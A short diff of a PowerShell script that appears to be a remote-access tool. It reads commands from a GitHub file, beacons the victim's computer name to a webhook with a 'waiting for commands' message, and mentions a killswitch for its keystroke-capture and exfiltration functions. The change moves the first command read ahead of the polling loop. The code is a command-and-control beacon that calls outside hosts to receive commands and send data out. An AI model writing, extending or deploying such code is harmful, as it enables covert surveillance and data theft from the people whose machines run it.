@@ -42,6 +42,8 @@ Killswitch : save github file contents as 'kill' to stop 'KeyCapture' or 'Exfilt
 # $CCurl = "YOUR SECONDARY GITHUB FILE URL"  # (optional)
 # $hookurl = "YOUR WEBHOOK URL"
 
+$response = Invoke-RestMethod -Uri $GHurl
+$previouscmd = $response
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":link: ``WAITING FOR COMMANDS..`` :link:"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 
@@ -364,9 +366,8 @@ Start-Sleep -Milliseconds 10
 }
 }
 
-$previouscmd = $response
-while($true){
 
+while($true){
 $response = Invoke-RestMethod -Uri $GHurl
 
     if ($response -match "$previouscmd") {
